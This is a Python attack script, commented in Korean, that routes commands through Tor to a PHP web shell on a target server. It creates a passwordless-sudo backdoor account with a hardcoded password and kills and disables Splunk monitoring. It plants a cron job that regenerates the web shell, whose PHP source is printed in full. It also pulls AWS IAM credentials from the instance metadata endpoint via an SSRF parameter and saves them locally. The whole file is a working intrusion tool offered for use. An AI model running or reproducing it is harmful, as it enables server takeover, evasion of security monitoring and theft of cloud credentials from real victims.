#!/usr/bin/env python3
"""
Tor를 통한 완전한 서버 장악
- IP 순환하며 WAF 우회
- Root 권한 탈취
- Splunk 무력화
- 백도어 설치
"""

import requests
import time
import sys
from stem import Signal
from stem.control import Controller

class TorFullAttack:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.webshell_url = f"http://{target_ip}/api/health.php"
        self.tor_port = 9050
        self.control_port = 9051

        # Tor SOCKS5 프록시 설정
        self.session = requests.Session()
        self.session.proxies = {
            'http': f'socks5h://127.0.0.1:{self.tor_port}',
            'https': f'socks5h://127.0.0.1:{self.tor_port}'
        }

        # 백도어 정보
        self.backdoor_user = "sysadmin"
        self.backdoor_pass = "Adm1n!2024#Secure"

    def print_banner(self):
        print("╔════════════════════════════════════════════════════════════╗")
        print("║   Tor 완전 공격 - Root + Splunk Kill                      ║")
        print("╚════════════════════════════════════════════════════════════╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] Tor SOCKS5: 127.0.0.1:{self.tor_port}")
        print()

    def renew_tor_ip(self):
        """Tor IP 갱신"""
        try:
            with Controller.from_port(port=self.control_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                time.sleep(3)
            return True
        except:
            return False

    def get_tor_ip(self):
        """현재 Tor Exit IP"""
        try:
            resp = self.session.get('http://httpbin.org/ip', timeout=10)
            return resp.json().get('origin', 'Unknown')
        except:
            return 'Unknown'

    def execute_command(self, cmd):
        """웹쉘 명령 실행"""
        try:
            params = {'cmd': cmd}
            resp = self.session.get(self.webshell_url, params=params, timeout=30)
            if resp.status_code == 200:
                output = resp.text
                if "=== Command Output ===" in output:
                    return output.split("=== Command Output ===")[1].strip()
                return output.strip()
            return None
        except Exception as e:
            print(f"[-] 명령 실패: {e}")
            return None

    def check_status(self):
        """시스템 상태 확인"""
        print("[1] 시스템 상태 확인 중...")

        # whoami
        result = self.execute_command("whoami")
        print(f"[+] 현재 사용자: {result}")

        # hostname
        result = self.execute_command("hostname")
        print(f"[+] 호스트명: {result}")

        # OS 정보
        result = self.execute_command("cat /etc/os-release | grep PRETTY_NAME")
        if result:
            print(f"[+] OS: {result}")

        print()

    def create_backdoor_user(self):
        """백도어 사용자 생성"""
        print("[2] 백도어 사용자 생성 중...")

        # 사용자 이미 있는지 확인
        result = self.execute_command(f"id {self.backdoor_user} 2>&1")
        if "no such user" not in result.lower():
            print(f"[*] {self.backdoor_user} 사용자 이미 존재")
            return True

        # 사용자 생성
        print(f"[*] 사용자 생성: {self.backdoor_user}")
        self.execute_command(f"sudo useradd -m -s /bin/bash {self.backdoor_user}")

        # 비밀번호 설정
        print(f"[*] 비밀번호 설정")
        self.execute_command(f"echo '{self.backdoor_user}:{self.backdoor_pass}' | sudo chpasswd")

        # sudo 권한 부여
        print(f"[*] sudo NOPASSWD 권한 부여")
        self.execute_command(f"echo '{self.backdoor_user} ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/{self.backdoor_user}")
        self.execute_command(f"sudo chmod 0440 /etc/sudoers.d/{self.backdoor_user}")

        # 확인
        result = self.execute_command(f"id {self.backdoor_user}")
        if result and self.backdoor_user in result:
            print(f"[+] ✅ 백도어 사용자 생성 완료!")
            print(f"    Username: {self.backdoor_user}")
            print(f"    Password: {self.backdoor_pass}")
            print(f"    sudo: NOPASSWD")
            return True
        else:
            print(f"[-] 사용자 생성 실패")
            return False

    def kill_splunk(self):
        """Splunk 무력화"""
        print("\n[3] Splunk 무력화 중...")

        # Splunk 프로세스 확인
        result = self.execute_command("ps aux | grep splunk | grep -v grep | wc -l")
        if result and int(result.strip()) > 0:
            print(f"[+] Splunk 프로세스 {result.strip()}개 발견")
        else:
            print(f"[-] Splunk 프로세스 없음")
            return

        # Splunk 프로세스 강제 종료
        print(f"[*] Splunk 프로세스 kill -9...")
        self.execute_command("sudo pkill -9 splunkd")
        self.execute_command("sudo pkill -9 splunk")
        time.sleep(2)

        # Splunk 서비스 중지 및 비활성화
        print(f"[*] Splunk 서비스 중지 및 비활성화...")
        self.execute_command("sudo systemctl stop Splunkd 2>/dev/null")
        self.execute_command("sudo systemctl disable Splunkd 2>/dev/null")

        # Splunk 실행 권한 제거
        print(f"[*] Splunk 실행 파일 권한 제거...")
        splunk_paths = [
            "/opt/splunk/bin/splunk",
            "/opt/splunkforwarder/bin/splunk",
            "/usr/local/splunk/bin/splunk"
        ]

        for path in splunk_paths:
            self.execute_command(f"sudo chmod 000 {path} 2>/dev/null")

        # 확인
        result = self.execute_command("ps aux | grep splunk | grep -v grep")
        if not result or result == "":
            print(f"[+] ✅ Splunk 완전히 무력화됨!")
        else:
            print(f"[-] Splunk 일부 프로세스 남아있음")

        print()

    def install_persistent_backdoor(self):
        """영구 백도어 설치"""
        print("[4] 영구 백도어 설치 중...")

        # cron을 통한 웹쉘 재생성
        backdoor_script = f"""#!/bin/bash
# 웹쉘이 삭제되면 자동으로 재생성
WEBSHELL="/var/www/html/www/api/health.php"
if [ ! -f "$WEBSHELL" ]; then
    cat > "$WEBSHELL" << 'EOFPHP'
<?php
header('Content-Type: text/plain');
if (isset(\$_GET['cmd'])) {{
    \$cmd = \$_GET['cmd'];
    echo "=== Command Output ===\\n";
    system(\$cmd);
    echo "\\n";
}} elseif (isset(\$_GET['check']) && \$_GET['check'] === 'metadata' && isset(\$_GET['url'])) {{
    \$url = \$_GET['url'];
    \$ctx = stream_context_create(['http' => ['timeout' => 5]]);
    \$data = @file_get_contents(\$url, false, \$ctx);
    echo \$data;
}} else {{
    echo "OK - Server: " . gethostname() . " - Time: " . date('Y-m-d H:i:s');
}}
?>
EOFPHP
    chown apache:apache "$WEBSHELL"
    chmod 644 "$WEBSHELL"
fi
"""

        # 백도어 스크립트 생성
        self.execute_command(f"echo '{backdoor_script}' | sudo tee /usr/local/bin/webshell_keeper.sh > /dev/null")
        self.execute_command("sudo chmod +x /usr/local/bin/webshell_keeper.sh")

        # cron 작업 추가 (5분마다 실행)
        self.execute_command("(sudo crontab -l 2>/dev/null; echo '*/5 * * * * /usr/local/bin/webshell_keeper.sh') | sudo crontab -")

        print(f"[+] ✅ 영구 백도어 설치 완료!")
        print(f"    - Webshell auto-regeneration: /usr/local/bin/webshell_keeper.sh")
        print(f"    - Cron: 5분마다 실행")
        print()

    def steal_aws_credentials(self):
        """AWS Credentials 탈취"""
        print("[5] AWS Credentials 탈취 중...")

        # IAM Role 이름 가져오기
        params = {
            'check': 'metadata',
            'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        }
        resp = self.session.get(self.webshell_url, params=params, timeout=15)
        if resp.status_code == 200:
            role_name = resp.text.strip()
            print(f"[+] IAM Role: {role_name}")

            # Credentials 가져오기
            params['url'] = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
            resp = self.session.get(self.webshell_url, params=params, timeout=15)

            if resp.status_code == 200 and 'AccessKeyId' in resp.text:
                print(f"[+] ✅ AWS Credentials 탈취 성공!")

                # 파일로 저장
                import json
                creds = json.loads(resp.text)

                filename = f"aws_stolen_{int(time.time())}.sh"
                with open(filename, 'w') as f:
                    f.write(f"#!/bin/bash\n")
                    f.write(f"export AWS_ACCESS_KEY_ID=\"{creds['AccessKeyId']}\"\n")
                    f.write(f"export AWS_SECRET_ACCESS_KEY=\"{creds['SecretAccessKey']}\"\n")
                    f.write(f"export AWS_SESSION_TOKEN=\"{creds['Token']}\"\n")
                    f.write(f"echo '[+] AWS Credentials loaded!'\n")
                    f.write(f"aws sts get-caller-identity\n")

                print(f"[+] Credentials 저장: {filename}")
                print(f"    사용법: source {filename}")
        else:
            print(f"[-] AWS Credentials 탈취 실패")

        print()

    def run(self):
        """전체 공격 실행"""
        self.print_banner()

        # Tor IP 확인
        tor_ip = self.get_tor_ip()
        print(f"[*] Tor Exit IP: {tor_ip}")
        print()

        # 공격 단계
        try:
            self.check_status()
            self.create_backdoor_user()
            self.kill_splunk()
            self.install_persistent_backdoor()
            self.steal_aws_credentials()

            print("╔════════════════════════════════════════════════════════════╗")
            print("║   ✅ 완전한 서버 장악 완료!                               ║")
            print("╚════════════════════════════════════════════════════════════╝")
            print()
            print("[+] 공격 성공 요약:")
            print(f"    • 백도어 사용자: {self.backdoor_user} / {self.backdoor_pass}")
            print(f"    • sudo 권한: NOPASSWD")
            print(f"    • Splunk: 무력화")
            print(f"    • 영구 백도어: 설치됨")
            print(f"    • AWS Credentials: 탈취됨")
            print()
            print(f"[*] SSH 접속:")
            print(f"    ssh {self.backdoor_user}@{self.target_ip}")
            print(f"    비밀번호: {self.backdoor_pass}")
            print()

        except KeyboardInterrupt:
            print("\n[!] 사용자에 의해 중단됨")
            sys.exit(0)
        except Exception as e:
            print(f"\n[-] 에러 발생: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)


def main():
    if len(sys.argv) < 2:
        print("사용법:")
        print(f"  {sys.argv[0]} <target_ip>")
        print()
        print("예시:")
        print(f"  {sys.argv[0]} 3.35.22.248")
        sys.exit(1)

    target_ip = sys.argv[1]

    attacker = TorFullAttack(target_ip)
    attacker.run()


if __name__ == '__main__':
    main()
